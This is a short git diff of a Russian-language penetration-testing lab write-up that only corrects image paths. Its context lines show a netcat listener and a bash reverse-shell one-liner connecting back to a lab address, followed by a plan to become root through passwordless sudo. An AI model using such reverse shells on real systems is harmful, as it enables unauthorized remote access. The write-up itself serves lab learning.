@@ -50,13 +50,13 @@
 
 ```nc -lvp 4444```
 
-![oops, problems with load](image/netcatLVP.jpg)
+![oops, problems with load](images/netcatLVP.jpg)
 
 теперь попробую подключится на kali с цели:
 
 ```bash -c 'bash -i >& /dev/tcp/192.168.166.222/4444 0>&1'```
 
-![oops, problems with load](image/CommandPanel.jpg)
+![oops, problems with load](images/CommandPanel.jpg)
 
 Да, у меня получилось. Теперь у меня есть reverse-shell, и как мы помним у нас есть все права на sudo без пароля,
 поэтому сразу я решил попробовать стать root через команду
